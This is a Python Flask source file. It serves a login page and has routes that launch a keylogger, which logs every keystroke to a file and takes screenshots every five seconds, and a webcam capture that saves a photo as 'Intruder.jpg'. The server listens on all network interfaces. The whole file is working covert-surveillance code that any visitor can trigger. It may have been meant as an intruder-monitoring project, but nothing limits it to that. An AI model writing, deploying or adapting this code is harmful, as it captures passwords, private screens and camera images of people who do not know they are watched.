from flask import Flask, render_template
import cv2
import os
import time
from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import queue

app = Flask(__name__)

keys = []
q = queue.Queue()

@app.route('/')
def login():
    return render_template("login.html")

@app.route('/runkeylogger')
def run_keylogger():
    def write_file(keys):
        with open("logs/log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(" ")
                if k.find("enter") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    class IntervalTimer(Timer):
        def run(self):
            while not self.finished.wait(self.interval):
                self.function(*self.args, **self.kwargs)

    class keylogger_main:
        def _build_logs(self):
            if not os.path.exists('logs'):
                os.mkdir('logs')

        def _on_press(self, k):
            global keys
            keys.append(k)
            if len(keys) >= 10:
                write_file(keys)
                keys = []

        def _keylogger(self):
            with Listener(on_press=self._on_press) as listener:
                listener.join()

        def _Screenshot(self):
            sct = mss()
            sct.shot(output='logs/Screenshots/{}.png'.format(time.time()))

        def run(self, interval):
            self._build_logs()
            Thread(target=self._keylogger).start()
            IntervalTimer(interval, self._Screenshot).start()

    km = keylogger_main()
    km.run(5)

    return "Keylogger executed successfully!"

@app.route('/runcaptureimage')
def run_captureimage():
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        ret, frame = cap.read()
        print(ret)
        print(frame)
    else:
        ret = False

    img1 = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

    directory = os.getcwd()
    os.chdir(directory)
    print(os.listdir(directory))
    filename = 'Intruder.jpg'
    cv2.imwrite(os.path.join(directory, filename), img1)

    cap.release()
    return "Capture image executed successfully!"

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000)
